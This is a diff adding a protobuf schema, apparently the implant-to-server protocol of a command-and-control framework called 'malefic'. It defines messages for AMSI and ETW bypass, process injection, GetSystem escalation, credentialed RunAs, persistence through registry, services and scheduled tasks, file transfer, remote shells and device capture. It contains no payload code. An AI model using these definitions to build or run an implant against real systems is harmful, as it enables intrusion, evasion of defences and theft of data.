@@ -1,0 +1,483 @@
+syntax = "proto3";
+package malefic;
+
+option go_package = "./malefic";
+
+
+message Ping{
+  int32 nonce = 1;
+}
+
+message Register {
+  string name = 1;
+  string proxy = 2;
+  repeated string module = 3;
+  repeated Addon addons = 4;
+  Timer timer = 5;
+  SysInfo sysinfo = 11;
+  Secure secure = 12;  // Implant's public key, used by server to encrypt data
+}
+
+message Secure{
+  bool enable = 1;
+  string key = 2;        // encryption key
+  string type = 3;       // encryption type
+  string public_key = 4;  // Implant's public key, used by server to encrypt data
+}
+
+
+// Age key exchange related messages
+message KeyExchangeRequest {
+  string public_key = 1;  // Temporary public key (Age X25519)
+  bytes signature = 2;             // Signature of temporary public key
+  uint64 timestamp = 3;            // Timestamp
+  string nonce = 4;                // Nonce
+}
+
+message KeyExchangeResponse {
+  string public_key = 1;  // Server temporary public key
+}
+
+message Init{
+  bytes data = 1;
+}
+
+message SysInfo {
+  string filepath = 1;
+  string workdir = 2;
+  bool is_privilege = 3;
+  Os os = 11;
+  Process process = 12;
+}
+
+message Suicide {
+  int32 type = 1;
+  int64 timestamp = 2;
+}
+
+
+// common empty request
+message Request {
+  string name = 1;
+  string input = 2;
+  repeated string args = 3;
+  map<string, string> params = 4;
+  bytes bin = 5;
+}
+
+message Response {
+  string output = 1;
+  string error = 2;
+  map<string, string> kv = 3;
+  repeated string array =4;
+}
+
+
+message BypassRequest{
+  bool ETW = 1;
+  bool AMSI = 2;
+  bool block_dll = 3;
+}
+
+message NetInterface {
+  int32 index = 1;
+  string name = 2;
+  string mac = 3;
+  repeated string ip_addresses = 4;
+}
+
+message SockTabEntry {
+  string local_addr = 1;
+  string remote_addr = 2;
+  string skState = 3;
+  //  uint32 uid = 4;
+  string pid = 5;
+  string protocol = 6;
+}
+
+message NetstatResponse {
+  repeated SockTabEntry socks = 1;
+}
+
+
+message Block{
+  uint32 block_id = 1;
+  bytes content = 2;
+  bool end = 3;
+}
+
+message ACK {
+  uint32 id = 1;
+  bool success = 2;
+  bool end = 3;
+}
+
+message Os {
+  string name = 1;
+  string version = 2; // kernel version
+  string release = 3; // release version
+  string arch = 4;
+  string username = 5;
+  string hostname = 6;
+  string locale = 7; // timezone
+  repeated string clr_version = 8;
+}
+
+message Process {
+  string name = 1;
+  uint32 pid = 2;
+  uint32 ppid = 3;
+  string owner = 4;
+  string arch = 5;
+  string path = 6;
+  string args = 7;
+  string uid = 8;
+}
+
+message Timer {
+  string expression = 1;
+  double jitter = 2;
+}
+
+message FileInfo {
+  string Name = 1;
+  bool IsDir = 2;
+  uint64 Size = 3;
+  int64 ModTime = 4;
+  uint32 Mode = 5;
+  string Link = 6;
+}
+
+message SacrificeProcess {
+  bool hidden = 1;
+  bool block_dll = 2;
+  bool etw = 3;
+  uint32 ppid = 4;
+  string argue = 5;
+}
+
+message LsResponse {
+  string Path = 1;
+  bool Exists = 2;
+  repeated FileInfo Files = 3;
+}
+
+message DriveInfo {
+  string path = 1;           // "C:\\"
+  string drive_type = 2;     // "Fixed drive"
+  uint64 total_size = 3;     //
+  uint64 free_size = 4;      //
+  string file_system = 5;    // "NTFS"
+}
+
+message EnumDriversResponse {
+  repeated DriveInfo drives = 1;
+}
+
+message PsResponse{
+  repeated Process processes = 1;
+}
+
+message ExecRequest {
+  string path = 1;
+  repeated string args = 2;
+  bool output = 3;
+  bool singleton = 4;
+  bool realtime = 5;
+  uint32 ppid = 10;
+}
+
+message ExecResponse {
+  int32 status_code = 1;
+  bytes stdout = 2;
+  bytes stderr = 3;
+  uint32 pid = 4;
+  bool end = 5;
+}
+
+message BinaryResponse {
+  bytes data = 1;      // common return, bof BeaconOutput
+  bytes message = 2;  // bof BeaconPrintf
+  string err = 4;
+  int32 status = 3;
+}
+
+message Modules {
+  repeated string modules = 1;
+  map<string, string> bundle_map = 2;
+}
+
+
+message Addons {
+  repeated Addon addons = 1;
+}
+
+message Addon {
+  string name = 1;
+  string type = 2;
+  string depend = 3;
+}
+
+message LoadModule{
+  string bundle = 1;
+  bytes bin = 2;
+}
+
+message LoadAddon{
+  string name = 1;
+  string type = 2;
+  string depend = 3;
+  bytes bin = 4;
+}
+
+message ExecuteAddon {
+  string addon = 1;
+  ExecuteBinary execute_binary = 2;
+}
+
+message ExecuteBinary {
+  string name = 1;
+  bytes bin = 2;
+  map<string, string> param = 3;
+  string type = 4;
+  string process_name = 5;
+  repeated string args = 6;
+  string entry_point = 7;
+  bytes data = 8;
+  bool output = 9;
+  uint32 arch = 10;
+  uint32 timeout = 11;
+  SacrificeProcess sacrifice = 12;
+  string path = 13;
+  string context = 14;
+  uint32 delay = 15; //millisecond
+}
+
+message ExecuteCommand {
+  string command = 1;
+  SacrificeProcess sacrifice = 2;
+}
+
+message UploadRequest {
+  string name = 1;
+  string target = 2;
+  uint32 priv = 3;
+  bytes data = 4;
+  bool hidden = 5;
+  bool override = 6;
+}
+
+message DownloadRequest {
+  string path = 1;
+  string name = 2;
+  uint32 buffer_size = 3;
+  bool dir = 4;
+  int32 cur = 5;
+}
+
+message DownloadResponse{
+  string checksum = 1;
+  uint64 size = 2;
+  int32 cur = 3;
+  bytes content = 4;
+}
+
+message CurlRequest{
+  string url = 1;
+  int32 timeout = 2;
+  string method = 3;
+  bytes  body = 4;
+  map<string, string> header =5;
+  string hostname = 6;
+}
+
+message ChownRequest{
+  string path = 1;
+  string uid = 2;
+  string gid = 3;
+  bool recursive = 4;
+}
+
+message IfconfigResponse {
+  repeated NetInterface net_interfaces = 1;
+}
+
+// wrap for client
+message RegistryRequest {
+  string type = 1;
+  Registry registry = 2;
+}
+
+message Registry {
+  string hive = 1;
+  string path = 2;
+  string key = 3;
+}
+
+message RegistryWriteRequest {
+  string hive = 1;
+  string path = 2;
+  string key = 3;
+  string string_value = 5;
+  bytes byte_value = 6;
+  uint32 dword_value = 7;
+  uint64 qword_value = 8;
+  uint32 regtype = 10;
+}
+
+message TaskScheduleRequest {
+  string type = 1;
+  TaskSchedule taskschd = 2;
+}
+
+message TaskSchedule {
+  string name = 1;
+  string path = 2;
+  string executable_path = 3;
+  uint32 trigger_type = 4;
+  string start_boundary = 5;
+  string description = 6;
+  bool enabled = 7;
+  string last_run_time = 8;
+  string next_run_time = 9;
+}
+
+
+message TaskSchedulesResponse {
+  repeated TaskSchedule schedules = 1;
+}
+
+// wrap for client
+message ServiceRequest {
+  string type = 1;
+  ServiceConfig service = 2;
+}
+
+message ServiceConfig {
+  string name = 1;
+  string display_name = 2;
+  string executable_path = 3;
+  uint32 start_type = 4;
+  uint32 error_control = 5;
+  string account_name = 6;
+}
+
+message ServiceStatus {
+  uint32 current_state = 1;
+  uint32 process_id = 2;
+  uint32 exit_code = 3;
+  uint32 checkpoint = 4;
+  uint32 wait_hint = 5;
+}
+
+message Service {
+  ServiceConfig config = 1;
+  ServiceStatus status = 2;
+}
+
+message ServicesResponse {
+  repeated Service services = 1;
+}
+
+message WmiQueryRequest {
+  string namespace = 1;
+  repeated string args = 2;
+}
+
+message WmiMethodRequest {
+  string namespace = 1;
+  string class_name = 2;
+  string method_name = 3;
+  map<string, string> params = 4;
+}
+
+message RunAsRequest {
+  string username = 1;    // Username to execute as
+  string domain = 2;      // User domain
+  string password = 3;    // User password
+  string program = 4;     // Program path
+  string args = 5;        // Program arguments (optional)
+  bool use_profile = 6;
+  bool netonly = 7;       // Use network credentials only (optional, default false)
+  bool use_env = 8;
+}
+
+message GetSystem{
+  bytes bin = 1;
+  uint32 pid = 2;
+}
+
+message Inject{
+  bytes bin = 1;
+  uint32 pid = 2;
+}
+
+message Pipe {
+  string name = 1;
+  string target = 2;
+  bytes data = 4;
+}
+
+message PipeRequest {
+  string type = 1;
+  Pipe pipe = 2;
+}
+
+message Switch {
+  repeated string urls = 1;
+}
+
+message TaskCtrl{
+  uint32 task_id = 1;
+  string op = 2;
+}
+
+message TaskInfo {
+  uint32 task_id = 1;
+  uint64 last = 2;
+  uint32 recv_count = 3;
+  uint32 send_count = 4;
+}
+
+message TaskListResponse {
+  repeated TaskInfo tasks = 1;
+}
+
+message FFmpegRequest {
+  string action = 1;
+  string device_name = 2;
+  string output_format = 3;
+  string output_path = 4;
+  string time = 5;
+}
+
+// PTY
+message PtyRequest {
+  string type = 1;            // type: "start", "input", "stop"
+  string session_id = 2;      //
+  string shell = 3;           // shell type: "/bin/bash", "cmd.exe", "powershell.exe"
+  uint32 cols = 4;            //
+  uint32 rows = 5;            //
+  bytes input_data = 6;       //
+  string input_text = 7;      //
+  map<string, string> params = 8; //
+}
+
+message PtyResponse {
+  string session_id = 1;      // Session ID
+  bytes output_data = 2;      // Output data (binary)
+  string output_text = 3;     // Output data (text)
+  string error = 4;           // Error message
+  bool session_active = 5;    // Whether session is still active
+  repeated string active_sessions = 6;
+  map<string, string> metadata = 7;
+}
+
+message CommonBody {
+  string name = 1;
+  repeated uint32 u32_array = 2;
+  repeated uint64 u64_array = 4;
+  repeated bool bool_array = 6;
+  repeated string string_array = 8;
+  repeated bytes bytes_array = 10;
+}
